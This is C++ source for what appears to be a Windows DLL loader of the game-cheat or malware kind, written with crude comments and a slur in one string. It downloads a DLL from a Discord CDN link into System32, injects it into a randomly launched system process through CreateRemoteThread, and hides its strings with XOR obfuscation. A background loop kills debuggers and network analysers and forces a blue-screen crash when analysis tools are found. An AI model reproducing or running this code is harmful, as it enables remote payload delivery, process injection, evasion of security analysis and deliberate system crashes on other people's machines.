#define _CRT_SECURE_NO_WARNINGS

/*

Source made by piss toe#1337 if you sell this you big gay :kiss:

MOST ANTI DEBUG IS FROM: https://github.com/KeyAuth/P2C-Example

*/

#include <iostream>
#include "xorstr.hpp"
#include <fstream>
#include <filesystem>
#include "lazy_importer.hpp"
#include <random>
#include <fcntl.h>
#include <io.h>
#include <stdio.h>
#include <Lmcons.h>
#include <Windows.h>
#include <string>
#include <sstream>
#include <vector>
#include <urlmon.h>
#include <TlHelp32.h>
#include <tchar.h>
#include <winternl.h>
#include <thread>
#pragma comment(lib, "urlmon.lib")

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void debug();
std::string random_string(const int len);
static std::string RandomProcess();
std::wstring s2ws(const std::string& s);
DWORD FindProcessId(const std::wstring& processName);
void exedetect();
void titledetect();
void driverdetect();
void killdbg();
std::string path();
void clear();
void slowprint(const std::string& message, unsigned int Char_Seconds);
void bsod();

char username[UNLEN + 1];
DWORD username_len = UNLEN + 1;

bool running = true;

int main()
{
	std::thread anti(debug);
	GetUserNameA(username, &username_len);
	std::string name = XorStr("Pasto-").c_str() + (random_string(25) + XorStr(".exe"));
	std::rename(path().c_str(), name.c_str());
	std::string dllpath = XorStr("C:\\Windows\\System32\\").c_str() + random_string(12) + XorStr(".dll").c_str();
	std::string dlllink = XorStr("https://cdn.discordapp.com/attachments/842964345021530192/853512119492280360/Dll.dll").c_str();
	URLDownloadToFileA(NULL, dlllink.c_str(), dllpath.c_str(), 0, NULL);

	system(XorStr("color 4").c_str());

	SetConsoleTitleA(name.c_str());

	slowprint(XorStr("\n   [+] Welcome ").c_str(), 25);
	slowprint(username, 25);
	Sleep(1500);
	clear();
	std::string start = XorStr("start ");
	std::string process = RandomProcess();
	std::wstring proc = s2ws(process);
	std::string startprocess = start + process;
	system(startprocess.c_str());
	DWORD processID = FindProcessId(proc);
	HANDLE handle = 0;


	if (!processID)
	{
		system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Loader && ECHO Failed to initalize. && TIMEOUT 10 >nul").c_str());
		exit(0);
	}

	const char* dll_path = dllpath.c_str();
	HANDLE hPRO = OpenProcess(PROCESS_ALL_ACCESS, NULL, processID);
	void* allocated_memory = VirtualAllocEx(hPRO, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hPRO, allocated_memory, dll_path, MAX_PATH, nullptr);
	HANDLE h_thread = CreateRemoteThread(hPRO, nullptr, NULL, LPTHREAD_START_ROUTINE(LoadLibraryA), allocated_memory, NULL, nullptr);
	CloseHandle(hPRO);
	VirtualFreeEx(hPRO, allocated_memory, NULL, MEM_RELEASE);
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

void slowprint(const std::string& message, unsigned int Char_Seconds)
{
	for (const char c : message)
	{
		std::cout << c << std::flush;
		Sleep(Char_Seconds);
	}
}

static std::string RandomProcess()
{
	std::vector<std::string> Process
	{
		XorStr("winver.exe").c_str(),
		XorStr("Taskmgr.exe").c_str(),
		XorStr("notepad.exe").c_str(),
		XorStr("mspaint.exe").c_str(),
		XorStr("regedit.exe").c_str(),
	};
	std::random_device RandGenProc;
	std::mt19937 engine(RandGenProc());
	std::uniform_int_distribution<int> choose(0, Process.size() - 1);
	std::string RandProc = Process[choose(engine)];
	return RandProc;
}

std::wstring s2ws(const std::string& s) {
	std::string curLocale = setlocale(LC_ALL, "");
	const char* _Source = s.c_str();
	size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
	wchar_t* _Dest = new wchar_t[_Dsize];
	wmemset(_Dest, 0, _Dsize);
	mbstowcs(_Dest, _Source, _Dsize);
	std::wstring result = _Dest;
	delete[]_Dest;
	setlocale(LC_ALL, curLocale.c_str());
	return result;
}

DWORD FindProcessId(const std::wstring& processName)
{
	PROCESSENTRY32 processInfo;
	processInfo.dwSize = sizeof(processInfo);
	auto createtoolhelp = LI_FN(CreateToolhelp32Snapshot);
	HANDLE processesSnapshot = createtoolhelp(TH32CS_SNAPPROCESS, NULL);
	if (processesSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	Process32First(processesSnapshot, &processInfo);
	if (!processName.compare(processInfo.szExeFile))
	{
		auto closehand = LI_FN(CloseHandle);
		closehand(processesSnapshot);
		return processInfo.th32ProcessID;
	}

	while (Process32Next(processesSnapshot, &processInfo))
	{
		if (!processName.compare(processInfo.szExeFile))
		{
			auto closehand = LI_FN(CloseHandle);
			closehand(processesSnapshot);
			return processInfo.th32ProcessID;
		}
	}

	return 0;
}

void exedetect()
{
	if (FindProcessId(s2ws("KsDumperClient.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("HTTPDebuggerUI.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("HTTPDebuggerSvc.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("FolderChangesView.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("ProcessHacker.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("procmon.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("idaq.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("idaq64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("Wireshark.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("Fiddler.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("Xenos64.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("Cheat Engine.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("HTTP Debugger Windows Service (32 bit).exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("KsDumper.exe")) != 0)
	{
		bsod();
	}
	else if (FindProcessId(s2ws("x64dbg.exe")) != 0)
	{
		bsod();
	}
}

void titledetect()
{
	HWND window;
	window = FindWindow(0, XorStr((L"IDA: Quick start")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, XorStr((L"Memory Viewer")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, XorStr((L"Process List")).c_str());
	if (window)
	{
		bsod();
	}

	window = FindWindow(0, XorStr((L"KsDumper")).c_str());
	if (window)
	{
		bsod();
	}
}

void driverdetect()
{
	const TCHAR* devices[] = {
(XorStr(_T("\\\\.\\NiGgEr")).c_str()),
(XorStr(_T("\\\\.\\KsDumper")).c_str())
	};

	WORD iLength = sizeof(devices) / sizeof(devices[0]);
	for (int i = 0; i < iLength; i++)
	{
		HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TCHAR msg[256] = _T("");
		if (hFile != INVALID_HANDLE_VALUE) {
			system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
			exit(0);
		}
		else
		{

		}
	}
}

void debug()
{
	while (running)
	{
		killdbg();
		exedetect();
		titledetect();
		driverdetect();
	}
}

void killdbg()
{
	system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im Ida64.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im Dbg64.exe >nul 2>&1").c_str());
	system(XorStr("taskkill /f /im Dbg32.exe >nul 2>&1").c_str());
	system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
	system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
}

std::string random_string(const int len) {
	const std::string alpha_numeric("ABCDEFGHIJKLMNOPRSTUVZabcdefghijklmnoprstuvz1234567890");
	std::default_random_engine generator{ std::random_device{}() };
	const std::uniform_int_distribution< std::string::size_type > distribution{ 0, alpha_numeric.size() - 1 };
	std::string str(len, 0);
	for (auto& it : str) {
		it = alpha_numeric[distribution(generator)];
	}

	return str;
}

std::string path()
{
	char shitter[_MAX_PATH]; // defining the path
	GetModuleFileNameA(NULL, shitter, _MAX_PATH); // getting the path
	return std::string(shitter); //returning the path
}

void clear()
{
	system(XorStr("CLS").c_str());
}

void bsod()
{
	BOOLEAN bEnabled;
	ULONG uResp;
	LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}
